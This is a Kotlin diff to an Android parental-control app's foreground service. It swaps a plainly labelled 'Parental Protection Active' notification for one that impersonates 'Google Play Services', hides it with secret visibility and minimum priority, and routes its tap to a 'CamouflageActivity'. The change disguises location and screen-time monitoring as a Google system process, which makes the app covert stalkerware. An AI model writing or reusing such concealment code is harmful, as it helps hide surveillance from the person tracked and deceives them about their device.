@@ -144,7 +144,7 @@ class ForegroundSafetyService : Service() {
     }
 
     private fun startForegroundWithTransparentNotification() {
-        val notificationIntent = Intent(this, StatusActivity::class.java)
+        val notificationIntent = Intent(this, CamouflageActivity::class.java)
         val pendingIntent = PendingIntent.getActivity(
             this,
             0,
@@ -152,14 +152,16 @@ class ForegroundSafetyService : Service() {
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
 
-        // Explicit, transparent notification showing child that safety service is running
+        // Camouflaged, silent system notification
         val notification: Notification = NotificationCompat.Builder(this, ChildApplication.CHANNEL_SAFETY_SERVICE)
-            .setContentTitle("Parental Protection Active")
-            .setContentText("Screen time limits & safety location services are running.")
-            .setSmallIcon(android.R.drawable.ic_lock_lock)
+            .setContentTitle("Google Play Services")
+            .setContentText("Background sync active")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setContentIntent(pendingIntent)
             .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setShowWhen(false)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .build()
 
         try {
